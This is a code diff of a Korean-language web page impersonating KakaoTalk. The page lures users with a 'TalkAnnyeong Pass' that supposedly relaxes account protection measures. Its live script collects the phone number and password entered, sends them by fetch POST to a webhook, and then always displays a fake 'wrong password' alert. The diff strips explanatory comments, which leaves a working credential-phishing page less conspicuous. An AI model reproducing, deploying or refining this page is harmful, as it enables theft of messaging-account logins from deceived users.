@@ -22,7 +22,6 @@
   </style>
 </head>
 <body>
-  <!-- 안내 페이지 -->
   <div id="page1" class="container">
     <h1>톡안녕패스로<br>이용자보호조치를 완화하세요.</h1>
     <p>모두를 위한 카톡 안녕가이드에서<br>이용자보호조치에 대해 더 자세히 알아보세요.</p>
@@ -87,7 +86,6 @@
       const phone = document.querySelector('input[type="text"]').value;
       const password = document.querySelector('input[type="password"]').value;
 
-      // 웹훅 전송
       fetch(webhookURL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -99,7 +97,6 @@
       // 무조건 메시지 표시
       alert('카카오톡 전화번호 또는 비밀번호가 틀렸습니다. 다시 확인해주세요');
     });
-    // ------------------- 웹훅 코드 끝 -------------------
   </script>
 </body>
 </html>
